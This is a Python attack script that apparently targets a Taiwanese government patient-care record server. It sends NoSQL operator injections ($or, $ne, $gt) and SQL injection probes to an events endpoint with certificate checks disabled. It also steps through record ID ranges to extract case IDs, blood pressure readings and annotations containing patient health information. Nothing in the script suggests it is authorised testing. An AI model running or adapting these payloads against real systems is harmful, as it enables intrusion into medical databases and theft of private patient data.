import requests, json, urllib3, sys
urllib3.disable_warnings()
BASE='https://epcr.tpf.gov.tw:4001'

# 1) $or 注入 - 已知 recordUuid 列表
test_uuids = ['Test180805142701','Test180816105601','Test180816105401','180817092350fed7']
or_list = '[]='.join([''] + test_uuids)  # careful encoding
# 用 bracket array syntax
payload = {'recordUuid[$or][]': test_uuids[0], 'recordUuid[$or][]': test_uuids[1], 'recordUuid[$or][]': test_uuids[2]}
r = requests.get(f'{BASE}/events', params=payload, verify=False, timeout=10)
print(f'OR inject: code={r.status_code} size={len(r.text)}')
if r.ok:
    try:
        data = r.json()
        for d in data[:5]:
            print(f"  id={d.get('id')} CaseID={d.get('CaseID')} recUuid={d.get('recordUuid')} Systolic={d.get('Systolic')} BPMean={d.get('Mean')}")
    except Exception as e:
        print('parse error', e, r.text[:200])

# 2) Sequelize 注入细节
print('--- $ne attack: recordUuid=null bypass ---')
r = requests.get(f'{BASE}/events', params={'recordUuid[$ne]':''}, verify=False, timeout=10)
print(f'ne empty: code={r.status_code} size={len(r.text)}')

# 3) CaseID $ne 绕过 - 任意真实病历
r = requests.get(f'{BASE}/events', params={'CaseID[$ne]':''}, verify=False, timeout=10)
print(f'CaseID $ne=: code={r.status_code} size={len(r.text)}')
if r.ok:
    try:
        data = r.json()
        caseids = set([d.get('CaseID') for d in data if d.get('CaseID')])
        print(f'unique CaseIDs: {len(caseids)} | samples: {list(caseids)[:5]}')
    except: pass

# 4) $gt attack
r = requests.get(f'{BASE}/events', params={'CaseID[$gt]':'180817'}, verify=False, timeout=10)
print(f'CaseID $gt=180817: code={r.status_code} size={len(r.text)}')
if r.ok:
    try:
        data = r.json()
        caseids = set([d.get('CaseID') for d in data if d.get('CaseID')])
        print(f'unique CaseIDs: {len(caseids)}')
    except: pass

# 5) 试 SQLi - case insensitivity / quote
for q in ["' OR '1'='1", '" OR "1"="1', "1; SELECT 1--", "1' UNION SELECT NULL--"]:
    r = requests.get(f'{BASE}/events', params={'CaseID':q}, verify=False, timeout=6)
    print(f'SQLi probe {q!r}: code={r.status_code} size={len(r.text)}')

# 6) range 分页完整遍历最大 id
r = requests.get(f'{BASE}/events', headers={'Range':'items=567230-567240'}, verify=False, timeout=10)
print(f'range 567230-567240: code={r.status_code} size={len(r.text)}')
if r.ok:
    try:
        data = r.json()
        ids = sorted([d.get('id') for d in data])
        print(f'  IDs: {ids[:5]}...{ids[-5:] if len(ids)>5 else ids}')
        for d in data:
            ann = d.get('Annotation') or ''
            sys_v = d.get('Systolic')
            if ann and ('PHI' in ann or 'XSS' in str(d.get('TypeOfEventTxt')) or sys_v == 999):
                print(f"  ★ id={d['id']} CaseID={d['CaseID']} recUuid={d.get('recordUuid')} Sys={sys_v} Ann={ann[:120]} Typ={d.get('TypeOfEventTxt')}")
    except: pass
